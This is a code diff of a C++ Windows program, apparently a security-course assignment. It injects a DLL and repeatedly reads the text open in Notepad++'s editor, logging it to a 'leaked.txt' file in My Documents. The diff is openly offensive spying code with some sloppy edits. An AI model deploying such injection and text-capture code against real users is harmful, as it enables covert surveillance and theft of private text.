@@ -53,24 +53,26 @@ void startSpy(HWND hwnd) {
     std::string previousText;
 
     // Get the path to the "My Documents" folder
-    wchar_t myDocumentsPath[MAX_PATH];
-    HRESULT result = SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, SHGFP_TYPE_CURRENT, myDocumentsPath);
+    WCHAR myDocumentsPath[MAX_PATH] = { 0. };
+
+    HRESULT result = SHGetFolderPath(NULL, CSIDL_PERSONAL, NULL, 0, (LPWSTR)myDocumentsPath);
+    wcscat_s(myDocumentsPath, L"\\leaked.txt");
     if (result != S_OK) {
         std::cerr << "Failed to get My Documents path." << std::endl;
         return;
     }
-    // Create the full path for the log file
-    std::string logFilePath = myDocumentsPath + L"\\Leaked.txt";
-    std::cout << logFilePath << std::endl;
+
+    /*std::cout << myDocumentsPath << std::endl;*/
+     /*Create the full path for the log file*/
     while (true) {
         HWND hEdit = FindWindowEx(hwnd, NULL, L"Scintilla", NULL);
         if (hEdit) {
             LRESULT textLength = SendMessage(hEdit, WM_GETTEXTLENGTH, 0, 0);
-            if (textLength > 0) {
+            if (textLength >= 0) {
                 std::string buffer(textLength + 1, '\0');
                 SendMessageA(hEdit, WM_GETTEXT, (WPARAM)(textLength + 1), (LPARAM)buffer.data());
                 if (buffer != previousText) {
-                    std::ofstream logFile(logFilePath);
+                    std::ofstream logFile(myDocumentsPath);
                     if (logFile.is_open()) {
                         logFile << buffer << std::endl;
                         logFile.close();
@@ -87,7 +89,8 @@ void startSpy(HWND hwnd) {
 }
 int main()
 {
-    const char* dllPath = "C:\\Users\\KOREA\\Desktop\\attack\\Release\\attack.dll";
+    /*const char* dllPath = "C:\\Users\\KOREA\\Desktop\\attack\\Release\\attack.dll";*/
+    const char* dllPath = "C:\\Users\\mm0ck3r\\Desktop\\lesson37\\assign06\\Project_real\\Release\\Dll.dll";
     DWORD processID = 0;
     HWND hwnd;
     if (GetFileAttributesA(dllPath) == 0xffffffff) {
@@ -115,6 +118,6 @@ int main()
         }
         printf("say 'y' when you want to spy on the notepad++: ");
     }
-;
+    ;
     return 0;
 }
